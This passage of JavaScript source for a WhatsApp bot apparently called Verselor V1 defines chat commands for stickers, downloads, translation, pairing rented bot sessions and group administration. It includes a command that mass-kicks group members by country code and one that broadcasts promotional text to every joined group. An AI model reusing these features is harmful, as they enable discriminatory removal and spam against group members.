  if (!args[0]) return Vreply(`Useage ${prefix + command} Example:\n ${prefix + command} 234xxx`)  
if ((m.mentionedJid && m.mentionedJid.length> 0) || m.quoted) {
    return Vreply(usageMessage);
}
  
    numero2 = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync(path.join(__dirname, '..', 'Access', 'Own.json'), JSON.stringify(Owner));
    fs.writeFileSync(path.join(__dirname, '..', 'Access', 'Prem.json'), JSON.stringify(Premium));
  Vreply(`Succesfully removed ${numero2} from being an owner!`);
  }
  break;
  //=================================================//


//=================================================//
case 'addpremium': case 'addprem': {
if (!isOwner) return Vreply(mess.owner) 
  if (!args[0]) return Vreply(`Useage ${prefix + command} Example ${prefix + command} 234xxx`);  
if ((m.mentionedJid && m.mentionedJid.length> 0) || m.quoted) {
    return Vreply(usageMessage);
}  
    numero = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (global.db.data.settings.premium.includes(numero)) return Vreply("Already a premium user.");
  let Invalid = await HeavstalTech.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return Vreply(`Number Invalid!!!`);
     global.db.data.settings.premium.push(numero); 
      await global.db.write();
  Vreply(`Syccesfully added ${numero} as a premium user!`);
  }
  break;
//=================================================//
  

//=================================================//
case 'delpremium': 
case 'delprem': {
if (!isOwner) return Vreply(mess.owner) 
  if (!args[0]) return Vreply(`Useage ${prefix + command} Example ${prefix + command} 234xxx`);  
if ((m.mentionedJid && m.mentionedJid.length> 0) || m.quoted) {
    return Vreply(usageMessage);
}  
 numero2 = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  numeroX = Premium.indexOf(numero2);
  if (numeroX > -1) {
  Premium.splice(numeroX, 1);
  await global.db.write(); 
    }
  Vreply(`Succesfully removed ${numero2} from being a premium user`);
  }
  break;
  //=================================================//

        
//=================================================//
case 'qc': {
    if (!q) return Vreply(`Send command with text. ${prefix + command} promise`);
    try {
        const pp = await HeavstalTech.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60');
        const obj = {
            type: 'quote',
            format: 'png',
            backgroundColor: '#ffffff',
            width: 512,
            height: 768,
            scale: 2,
            messages: [{
                entities: [],
                avatar: true,
                from: {
                    id: 1,
                    name: pushname,
                    photo: { url: pp }
                },
                text: q,
                replyMessage: {}
            }]
        };

        const response = await fetch('https://bot.lyo.su/quote/generate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(obj)
        });
        const data = await response.json();
        const buffer = Buffer.from(data.result.image, 'base64');
        
        await HeavstalTech.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, author: global.author });
    } catch (e) {
        console.error(e);
        Vreply(mess.error.fitur);
    }
}
break;
//=================================================//
        

//=================================================//
case "play": { 
if (!text) return Vreply(example("past lives"))
await HeavstalTech.sendMessage(m.chat, {react: {text: '🎥', key: m.key}})
Vreply(mess.wait);
await loading();
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]
const anu = await ytdl.ytmp3(`${res.url}`)
if (anu.status) {
let urlMp3 = anu.download.url
await HeavstalTech.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await HeavstalTech.sendMessage(m.chat, {react: {text: '', key: m.key}})
} else {

return Vreply("Error! Result Not Found")
}
}
break;
//=================================================//
     

//=================================================//
case 'pair':
if (!isOwner) return Vreply(mess.owner)
  if (!q) return Vreply(`Example:\n ${prefix + command} 234xxx`)
   if ((m.mentionedJid && m.mentionedJid.length> 0) || m.quoted) {
    return Vreply(usageMessage);
}

let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
if (target === botNumber) return (`𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗\n\nʙᴏᴛ ɴᴜᴍʙᴇʀ ᴄᴀɴɴᴏᴛ ʙᴇ ʀᴇ-ᴘᴀɪʀᴇᴅ\n\n${footer}`);
  const contactInfo = await HeavstalTech.onWhatsApp(target);
  if (contactInfo.length == 0) {
    return Vreply("The number is not registered on WhatsApp");
  }
  Vreply(`𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗜𝗡 𝗣𝗥𝗢𝗖𝗘𝗦\n\nsᴇᴛᴛɪɴɢ ᴜᴘ ᴀ sᴛᴀʙʟᴇ ᴄᴏɴғɪɢᴜʀᴀᴛɪᴏɴ ғᴏʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ: ${target}\n\nᴛʜɪs ᴍᴀʏ ᴛᴀᴋᴇ ᴀ ᴡʜɪʟᴇ\n\n${footer}`)
  const startpairing = require(path.join(__dirname, '..', 'Connection', 'rentbot.js'));
  await startpairing(target);
  await sleep(6000)
  const cu = fs.readFileSync(path.join(__dirname, '..', 'lib', 'pairing', 'pairing.json'));
  const cuObj = JSON.parse(cu);
  await HeavstalTech.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: `Code: ${cuObj.code}\n\n*Use this Code to become a bot user.*\n\n
            1. On your WhatsApp home page, click on the three dots in the top right corner.
            2. Tap *Linked Device*
            3. Tap *Link a device*
            4. Just below there will be a *Link with phone number instead*, tap on it
            5. Paste your 6 character code.`
          },
          header: {},
          nativeFlowMessage: {
            buttons: [{
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: "COPY",
                url: `https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp${cuObj.code}`,
                copy_code: cuObj.code,
              })
            }]
          }
        }
      }
    }
  }, {});
break;
//=================================================//


//=================================================//
case 'delpair':
  if (!q) return Vreply(`Example: ${prefix + command} 234xxx`);
  const dirPath = path.join(__dirname, '..', 'Connection', 'pairing/');
  const folderName = fs.readdirSync(dirPath).find((file) => {
    return file.endsWith(`${q}@s.whatsapp.net`);
  });
  if (!folderName) return Vreply(`Folder not found: ${q}`);
  try {
    fs.rmdirSync(path.join(dirPath, folderName), { recursive: true });
    Vreply(`pair number deleted Successfully: ${folderName}`);
  } catch (err) {
    Vreply(`Error deleting paired device ${err.message}`);
  }
break;
//=================================================//


//=================================================//
case "setpp": 
case "setppbot": {
  if (!isOwner) return Vreply(mess.owner) 
  if (!m.quoted) return Vreply("Reply to an image with this command to set profile picture!");
  
  try {
    const media = await HeavstalTech.downloadAndSaveMediaMessage(m.quoted);
    const { img } = await generateProfilePicture(media);

    await HeavstalTech.query({
      tag: "iq",
      attrs: {
        to: BotNum,
        type: "set",
        xmlns: "w:profile:picture"
      },
      content: [{
        tag: "picture",
        attrs: {
          type: "image"
        },
        content: img
      }]
    });

    await Vreply("Profile picture set successfully!");
  } catch (error) {
    console.error(error);
    await Vreply("Failed to set profile picture. Make sure you replied to an image and try again.");
  }
}
break;
//=================================================//


//=================================================//
case 'deletepp':
           case 'delpp': 
           case 'deleteppbot': 
           case 'delppbot': {       
           if (!isOwner) return Vreply(mess.owner);
           try {
            Vreply(mess.wait)
await loading()
            await HeavstalTech.removeProfilePicture(HeavstalTech.user.id)
             Vreply(`*SUCCESFULLY DELETED PROFILE PICTURE*\n\n${footer}`);
               } catch (error) {
    console.error(error);
    await Vreply(`*Failed To Delete Profile Picture.*\n\n${footer}`);
  }
			}
			break;
//=================================================//	
			
	
//=================================================//
case 'deleteppgroup':
   case 'delppgroup': 
    case 'deleteppgroup': 
       case 'delppgroup': {
           
           if (!m.isGroup) return Vreply(mess.only.group)
              if (m.isGroup && !isBotAdmin) return Vreply(mess.badm)
              if (m.isGroup && !isAdmin) return Vreply(mess.only.admin)
           try {
            Vreply(mess.wait)
await loading()
            await HeavstalTech.removeProfilePicture(m.chat)
             Vreply(`*SUCCESFULLY DELETED GROUP PROFILE PICTURE*\n\n${footer}`);
               } catch (error) {
    console.error(error);
    await Vreply(`*Failed To Delete Group Profile Picture.*\n\n${footer}`);
  }
			}
			break;
//=================================================//


//=================================================//
case 'tovn': {
    if (!quoted) return Vreply(`Reply to a video or audio with caption ${prefix + command}`);
    if (!/video/.test(mime) && !/audio/.test(mime)) return Vreply(`Only video and audio files are supported for this command.`);
    await HeavstalTech.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    
    try {
        let media = await quoted.download();
        let audio = await toPTT(media, /video/.test(mime) ? 'mp4' : 'mp3');
        await HeavstalTech.sendMessage(m.chat, { 
            audio: audio, 
            mimetype: 'audio/ogg; codecs=opus', 
            ptt: true 
        }, { quoted: m });
        await HeavstalTech.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error("[TOVN ERROR]:", err);
        Vreply(`❌ Failed to convert media to Voice Note.`);
    }
}
break;
//=================================================//

        
//=================================================//
case 'hidetag': {
  if (!isOwner) return Vreply(mess.owner) 
  if (!m.isGroup) return Vreply(mess.only.group)
  HeavstalTech.sendMessage(from, { text: q ? q : `*Verselor V1 Is Here*\n\n${footer}`, mentions: participants.map(a => a.id) }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case 'resetlinkgc': {
  if (!isOwner) return Vreply(mess.owner) 
  if (!m.isGroup) return Vreply(mess.only.group) 
   if (m.isGroup && !isBotAdmin) return Vreply(mess.badm)
  
  HeavstalTech.groupRevokeInvite(from);
}
break;
//=================================================//


//=================================================//
case 'public': {
  if (!isOwner) return Vreply(mess.owner) 
  HeavstalTech.public = true;
  Vreply(`*Successfully Changed ʙᴏᴛ Mode To Public*\n\n${footer}`);
}
break;
//=================================================//


//=================================================//
case 'self': case 'private': {
  if (!isOwner) return Vreply(mess.owner)
  HeavstalTech.public = false;
  Vreply(`*Successfully Changed Verselor Mode To Self*\n\n${footer}`);
}
break;
//=================================================//


//=================================================//
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return Vreply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return Vreply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return Vreply('Failed to download media!');
    }

    const uploadImage = path.join(__dirname, '..', 'System', 'Data6.js');
    const uploadFile = path.join(__dirname, '..', 'System', 'Data7.js');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return Vreply('Failed to upload media!');
    }

    HeavstalTech.sendMessage(m.chat, {
        text: `*Successfully Converted To Url*\n ${link}`
    }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case 'kaomoji':
case 'specialemoji':
case 'semoji': {
    try {
        const kaomojiPath = path.join(__dirname, '..', 'lib', 'kaomoji.json');
        if (!fs.existsSync(kaomojiPath)) {
            return Vreply("Error: kaomoji.json database not found.");
        }
        const kaomojis = JSON.parse(fs.readFileSync(kaomojiPath));
        const categories = Object.keys(kaomojis);
        const categoryList = categories.map((cat, index) => `${index + 1}. ${cat.charAt(0).toUpperCase() + cat.slice(1)}`).join('\n');
        const input = text ? text.toLowerCase().replace(/ /g, '_') : null;
        if (!input || !kaomojis[input]) {
            return Vreply(`*Please specify a category:*\n\n> *AVAILABLE LIST*\n${categoryList}\n\n*Example:* ${prefix + command} love\n\n${footer}`);
        }
        const selectedList = kaomojis[input];
        const randomKaomoji = selectedList[Math.floor(Math.random() * selectedList.length)];
        Vreply(`*HERE IS A SPECIAL KAOMOJI JUST FOR YOU ❤️‍🔥*\n\n${randomKaomoji}`);
    } catch (e) {
        console.error(e);
        Vreply(`${mess.error.fitur}\nDetails: ${e}`);
    }
}
break;
//=================================================//


//=================================================//
case 'sticker': case 's': {
  if (!quoted) return Vreply(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await HeavstalTech.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return Vreply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await HeavstalTech.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return Vreply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
//=================================================//


//=================================================//
case 'test':
case 'status': {
Vreply(mess.wait);
await loading();
Vreply(`*Bot Online ✅*`);
}
break;
//=================================================//


//=================================================//

case 'q': case 'quoted': {
if (!m.quoted) return Vreply('Reply the Message!!')
let isQuoted = await XeonBotInc.serializeM(await m.getQuotedObj())
if (!isQuoted.quoted) return Vreply('The message you are replying to is not sent by the bot')
await isQuoted.quoted.copyNForward(m.chat, true)
}
break;
//=================================================//


//=================================================//
case 'reactch': 
case 'react-ch': {
 	if (!isOwner) return Vreply(mess.owner)
    if (!q) {
        return Vreply(`Provide A Channel Link And Message Id\n\nExample 1: ${prefix}channel-link/message-id (message) \n\nExample 2: ${prefix + command} https://whatsapp.com/channel/XXXXXXXXXXXXX/234 Hello`);}
    if (!q.startsWith("https://whatsapp.com/channel/")) {
        return Vreply("Link invalid!");}
    const Reaction = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒' };
    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return Reaction[c] || c;
    }).join('');
    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];
        const res = await HeavstalTech.newsletterMetadata("invite", channelId);
        await HeavstalTech.newsletterReactMessage(res.id, messageId, emoji);
        return Vreply(`Succeafully sent *${emoji}* to the message in the channel *${res.name}*.\n\n${footer}`);
    } catch (e) {
        console.error(e);
        return Vreply("Failed to send reaction. Please make sure the link and emoji are valid.");
    }}
break;
//=================================================//

 
//=================================================//
case 'checkidch': case 'idch': {
if (!text) return Vreply(`Provide A Link\n\nExample: ${prefix + command} <channel-link>`)
if (!text.includes("https://whatsapp.com/channel/")) return Vreply("Link is not valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await HeavstalTech.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Name :* ${res.name}
* *Follower:* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}
`
return Vreply(teks)
}
break;
//=================================================//


//=================================================//
case 'tagall': {
if (m.isGroup && !isBotAdmin) return Vreply('_Bots Should Be Admins First_')
if (m.isGroup && !isAdmin) return Vreply(mess.only.admin)
if (!m.isGroup) return Vreply(mess.only.group)
let teks = `══✪〘 *Tag All* 〙✪══
 ➲ *Message : ${q ? q : '𝐇𝐄𝐀𝐕𝐒𝐓𝐀𝐋 𝐇𝐄𝐑𝐄 𝐈𝐒 𝐇𝐄𝐑𝐄'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
HeavstalTech.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'kick': 
case 'fling': {
    if (!m.isGroup) return Vreply(mess.only.group);
    if (!isBotAdmin) return Vreply(mess.badm);
    if (!isAdmin) return Vreply(mess.only.admin);
    if (m.mentionedJid && m.mentionedJid.length > 0) {
        await HeavstalTech.groupParticipantsUpdate(from, m.mentionedJid, 'remove');
        return Vreply(mess.done);
    }
    if (!text) return Vreply(`*System: Kick Manager*\n\nUsage:\n1. *${prefix + command} <@user>*\n2. *${prefix + command} <number>*\n_Examaple:_ ${prefix + command} 23481xxxx\n3. *${prefix + command} <country code>* (Auto-kick ALL members with country code)\n_Example:_ ${prefix + command} +91`);

    let cleanNumber = text.replace(/[^0-9]/g, '');
    if (!cleanNumber) return Vreply("Please provide a valid number.");
    if (cleanNumber.length < 4) {
        const groupMetadata = await HeavstalTech.groupMetadata(from);
        const participants = groupMetadata.participants;
        let targets = participants.filter(member => 
            member.id.startsWith(cleanNumber) && 
            !member.admin && 
            member.id !== BotNum && 
            member.id !== m.sender &&
            !isOwner
        ).map(member => member.id);

        if (targets.length === 0) {
            return Vreply(`No non-admin members found with country code +${cleanNumber}.`);
        }
        Vreply(`*⚠ MASS KICK DETECTED*\n\nTarget Code: +${cleanNumber}\nFound: ${targets.length} members.\n\n_Removing them now..._`);
        await HeavstalTech.groupParticipantsUpdate(from, targets, 'remove');
        return Vreply(`✅ Successfully removed ${targets.length} members starting with +${cleanNumber}.`);
    } 
    else {
        let user = cleanNumber + '@s.whatsapp.net';
        await HeavstalTech.groupParticipantsUpdate(from, [user], 'remove');
        return Vreply(mess.done);
    }
}
break;
//=================================================//


//=================================================//
case 'add': {
if (!m.isGroup) return Vreply(mess.only.group)
if (m.isGroup && !isBotAdmin) return Vreply(mess.badm)
if (m.isGroup && !isAdmin) return Vreply(mess.only.admin)
if (!text) return Vreply(`Provide The Number You Want To Add\nExample: ${prefix}add 23481xxxx`)
let users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
await HeavstalTech.groupParticipantsUpdate(from, [users], 'add')
Vreply(mess.done)
}
break;
//=================================================//

//=================================================//
case 'promote': {
if (!m.isGroup) return Vreply(mess.only.group)
if (m.isGroup && !isBotAdmin) return Vreply(mess.badm)
if (m.isGroup && !isAdmin) return Vreply(mess.only.admin)
let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'; 
await HeavstalTech.groupParticipantsUpdate(from, [users], 'promote')
Vreply("*Done*...")
}
break;
//=================================================//

//=================================================//
case 'demote': {
if (!m.isGroup) return Vreply(mess.only.group)
if (m.isGroup && !isBotAdmin) return Vreply(mess.badm)
if (m.isGroup && !isAdmin) return Vreply(mess.only.admin)
let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'; 
await HeavstalTech.groupParticipantsUpdate(from, [users], 'demote')
Vreply("*Done*....")
}
break;
//=================================================//

//=================================================//
           case 'advertise':
            case 'broadcast': {  
                if (!isOwner) return Vreply(mess.owner)
                if (!text) return Vreply(example(`text to advertise`))
                let getGroups = await HeavstalTech.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                Vreply(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(4000)
                    let a = `\n\n` + '```' + `Message: ${text}\n\n` + '``` \n𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏 ²⁶'
                    HeavstalTech.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: m.pushName,
                                body: `Sending msg in ${i.length} Group`,
                                thumbnailUrl: 'https://files.catbox.moe/g8pxls.png',
                                sourceUrl: 'https://whatsapp.com/channel/0029VbBcg80KwqSR7dr7do1D',
                                mediaType: 1,
                                renderLargerThumbnail: false
                            }
                        }
                    })
                }
                Vreply(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break;
//=================================================//
            

 
//=================================================//           
case "xvideodl": {  
if (!text) return Vreply(example(`xvideo link`))
if (!text.includes("xvideos.com")) return Vreply("Link is not from xvideos.com")
await HeavstalTech.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
try {
let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
let json = await res.json();
if (json.status !== 200 || !json.data) {
throw "Cannot find video for this URL.";
}
let videoData = json.data;
const videoUrl = videoData.url;
const videoResponse = await fetch(videoUrl);
if (!videoResponse.ok) {
throw "Failed to download video.";
}
await HeavstalTech.sendMessage(m.chat, {
video: {
url: videoUrl,
},
caption: `**Title:** ${videoData.title || 'No title'}\n` +
`**Views:** ${videoData.views || 'No view information'}\n` +
`**Votes:** ${videoData.vote || 'No vote information'}\n` +
`**Likes:** ${videoData.like_count || 'No like information'}\n` +
`**Dislikes:** ${videoData.dislike_count || 'No dislike information'}`,
});
await HeavstalTech.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (e) {
console.log(`Error downloading video: ${e}`);
}
}
break;
//=================================================//



//=================================================//
case "addsudo": case "setsudo": {
if (!isOwner) return Vreply(mess.owner)
if (text) {
if ((m.mentionedJid && m.mentionedJid.length> 0) || m.quoted) {
    return Vreply(usageMessage);
}
let orang = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
if (global.db.data.settings.sudo.includes(orang)) return Vreply(`*User ${orang.split('@')[0]} Already Existed As A Sudo User...`)
global.db.data.settings.sudo.push(orang)
await global.db.write();
Vreply(`*Succesfully Added ${orang.split('@')[0]} To Sudo List*`)
} else {
return Vreply(`*INCORRECT USAGE*\n\n*USAGE:* ${prefix + command} 234xxxx`)
}}
break;
//=================================================//


//=================================================//
case "delsudo": case "removesudo":  {
if (!isOwner) return Vreply(mess.owner)
if (text) {
if ((m.mentionedJid && m.mentionedJid.length> 0) || m.quoted) {
    return Vreply(usageMessage);
}

let orang = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
if (!global.db.data.settings.sudo.includes(orang)) return Vreply(`*User ${orang.split('@')[0]} Does Not Exist In Sudo List...`)
let indx = global.db.data.settings.sudo.indexOf(orang)
global.db.data.settings.sudo.splice(indx, 1)
await global.db.write();
Vreply(`Succesfully Deleted ${orang.split('@')[0]} From Sudo List`)
} else {
return Vreply(`*INCORRECT USAGE*\n\n*USAGE:* ${prefix + command} 234xxxx`)
}}
break;
//=================================================//


//=================================================//
case "listsudo": case "getsudo": {
if (!isOwner) return Vreply(mess.owner)
if (!m.isGroup) return Vreply(mess.only.group) 
if (setsudo.length < 1) return Vreply("*No Sudo Users Found Here*")
let teksnya = `*Total Sudo Users Found Here Are:*\n`
setsudo.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
await HeavstalTech.sendMessage(m.chat, {text: teksnya, mentions: [... setsudo]}, {quoted: m})
}
break;
//=================================================//


//=================================================//
case "get": case "g": {
if (!isOwner) return Vreply(mess.owner)
if (!text) return Vreply(example("https://example.com"))
let data = await fetchJson(text)
Vreply(JSON.stringify(data, null, 2))
}
break;
//=================================================//



//=================================================//
case "joinch": case "joinchannel": {
if (!isOwner) return Vreply(mess.owner)
if (!text && !m.quoted) return Vreply(`*Process Failed*\n\n*Error:* No Channel Link Dected.\nPlease Provide A Valid Channel Link\n\n${footer}`)
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return Vreply(`*Process Failed*\n\n*Error:* Invalid Channel Link.\nPlease Provide A Valid Channel Link\n\n${footer}`)
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await HeavstalTech.newsletterMetadata("invite", result)
await HeavstalTech.newsletterFollow(res.id)
Vreply(`
* Channel followed successfully ✅*
* Channel name : *${res.name}*
* Total followers : *${res.subscribers + 1}*
`)
}
break;
//=================================================//


//=================================================//
case "tohd": 
case "hd": {
if (!/image/.test(mime)) return Vreply(example("kindly reply to a media"))
await HeavstalTech.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
let foto = await HeavstalTech.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await HeavstalTech.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
await HeavstalTech.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break;
//=================================================//



//=================================================//
case 'detect':
case 'isaitext':
case 'sentinel': {
    const content = text || m.quoted?.text;
    if (!content) {
        return Vreply(`*Please Provide Text to Analyze*\n\nExample: ${prefix + command} [Paste text here]\nOr reply to a message containing the text.`);
    }
    const wordCount = content.trim().split(/\s+/).length;
    if (wordCount < 40) {
        return Vreply(`*⚠️ Text Too Short*\n\nCurrent word count: ${wordCount}\nMinimum required: 40 words\n\nPlease provide longer text to ensure accurate detection.`);
    }
    Vreply(mess.wait)
await loading();
    try {
        const apiKey = HT_API_KEY;
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/sentinel', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ text: content.trim() })
        });
        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const { score, verdict, analysis } = res.data;
            const statusIcon = score > 50 ? '🤖' : '👤';
            const msg = `*🛡️ AI Text Detector*\n\n` +
                        `⚖️ *Verdict:* ${verdict} ${statusIcon}\n` +
                        `📊 *AI Probability:* ${score}%\n\n` +
                        `📝 *Analysis:* ${analysis}\n\n` +
                        `${footer}`;

            await Vreply(msg);

        } else {
            await Vreply(`*Detection Failed*\n\n${res.error || 'Could not analyze text.'}`);
        }
    } catch (e) {
        console.error("Sentinel Command Error:", e);
        Vreply(`*Error:* An unexpected error occurred.`);
    }
}
break;
//=================================================//


//=================================================//
case 'tr':
case 'translate': {
    const content = text || m.quoted?.text;
    if (!content) return Vreply(`*Please Provide Text to Translate*\n\nExample: ${prefix + command} Bonjour\nOr reply to a message.`);
    Vreply(mess.wait)
await loading();
    try {
        const apiKey = HT_API_KEY;
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/translate', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ text: content.trim() })
        });
        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const { original, translated, source_language, pronunciation } = res.data;
            const msg = `*🌍 Heavstal Universal Translator*\n\n` +
                        `📥 *Detected:* ${source_language ? source_language.toUpperCase() : 'Unknown'}\n` +
                        `📄 *Original:* ${original}\n\n` +
                        `📤 *To:* English\n` +
                        `📝 *Translation:* ${translated}\n` +
                        (pronunciation ? `🗣️ *Pronunciation:* ${pronunciation}` : '');
            await Vreply(msg);
        } else {
            await Vreply(`*Translation Failed*\n\n${res.error || 'Could not translate text.'}`);
        }
    } catch (e) {
        console.error("Translate Command Error:", e);
        Vreply(`*Error:* An unexpected error occurred.`);
    }
}
break;
//=================================================//

//=================================================//
case 'metadata':
case 'linkinfo':
case 'urlinfo': {
    const content = text || m.quoted?.text;
    if (!content) return Vreply(`*Please Provide a URL*\n\nExample: ${prefix + command} https://youtube.com\nOr reply to a message containing a link.`);
    const urlRegex = /(https?:\/\/[^\s]+)/g;
    const match = content.match(urlRegex);
    if (!match) return Vreply(`*Invalid Input*\n\nNo valid URL found in the provided text.`);
    const targetUrl = match[0];
    Vreply(mess.wait)
await loading();
    try {
        const apiKey = HT_API_KEY;
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/metadata', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ url: targetUrl })
        });
        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const { title, description, image, site_name, url } = res.data;
            const caption = `*🔗 Link Metadata Inspector*\n\n` +
                            `📌 *Title:* ${title || 'N/A'}\n` +
                            `🏢 *Site Name:* ${site_name || 'N/A'}\n` +
                            `📝 *Description:* ${description || 'No description available.'}\n` +
                            `🔗 *URL:* ${url}\n\n` +
                            `${footer}`;
            if (image) {
                await HeavstalTech.sendMessage(m.chat, {
                    image: { url: image },
                    caption: caption
                }, { quoted: m });
            } else {
                await HeavstalTech.sendMessage(m.chat, {
                    text: caption
                }, { quoted: m });
            }
        } else {
            await Vreply(`*Metadata Fetch Failed*\n\n${res.error || 'Could not extract data from this link.'}`);
        }
    } catch (e) {
        console.error("Metadata Command Error:", e);
        Vreply(`*Error:* An unexpected error occurred.`);
    }
}
break;
//=================================================//


//=================================================//
case 'getdevice':
case 'device':
case 'phone': {
if (!m.quoted) return Vreply(`*Process Failed*\n\n*Error:* No Mention Message Dectected.\nPlease Reply To A Message Or Tag A User\n\n${footer}`)
await HeavstalTech.sendMessage(m.chat, {text: `@${m.quoted.sender.split('@')[0]} is using ${await getDevice(m.quoted.id)}`}, {quoted: m})
}
break;
//=================================================//

//=================================================//
case 'ss':
case 'ssweb':
case 'screenshot': {
    if (!text) return Vreply(`*Please Provide A URL*\n\nExample: ${prefix + command} https://github.com --phone`);
    let targetUrl = text.trim();
    let deviceType = 'desktop';
    if (targetUrl.includes("--phone") || targetUrl.includes("--mobile")) {
        deviceType = 'phone';
        targetUrl = targetUrl.replace("--phone", "").replace("--mobile", "");
    } else if (targetUrl.includes("--tablet")) {
        deviceType = 'tablet';
        targetUrl = targetUrl.replace("--tablet", "");
    }
    targetUrl = targetUrl.trim();
    if (!targetUrl.startsWith("http")) {
        targetUrl = "https://" + targetUrl;
    }
    Vreply(mess.wait)
await loading();

    try {
        const apiKey = HT_API_KEY      
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/screenshot', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ 
                url: targetUrl,
                type: deviceType
            })
        });

